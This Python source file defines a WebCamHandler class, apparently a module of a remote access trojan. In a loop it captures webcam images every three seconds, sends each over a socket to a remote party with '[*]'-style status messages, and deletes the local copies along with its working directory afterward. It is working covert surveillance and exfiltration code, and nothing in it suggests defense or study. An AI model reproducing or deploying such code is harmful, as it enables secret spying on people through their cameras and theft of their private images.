import os
import cv2,time,datetime
from FileHandling import FileHandler
from DataHandling import DataHandling

class WebCamHandler:
    def __init__(self,soc_obj,path):
        self.soc=soc_obj
        self.path=path
        self.stop_flag=False
        self.cam = cv2.VideoCapture(0)
        self.file_handler = FileHandler(self.soc)
        self.data_handler = DataHandling(self.soc)

    def capture_webcam_image(self):
        
        while self.stop_flag==False:
            result,image = self.cam.read()
            if result:
                date_time=datetime.datetime.now()
                file=self.path+'\\webCam{}.png'.format(date_time)
                cv2.imwrite(file,image)
                self.data_handler.data_send("[*] webcam snapshot taken..")
                self.file_handler.file_send(file)
                self.data_handler.data_send("[*] webcam snapshot sended...")
                os.remove(file)
                time.sleep(3)

    def stop_webcam_image(self):
        self.stop_flag=True
        self.cam.release()
        self.data_handler.data_send("[*] webcam stoped...")
        os.remove(self.path)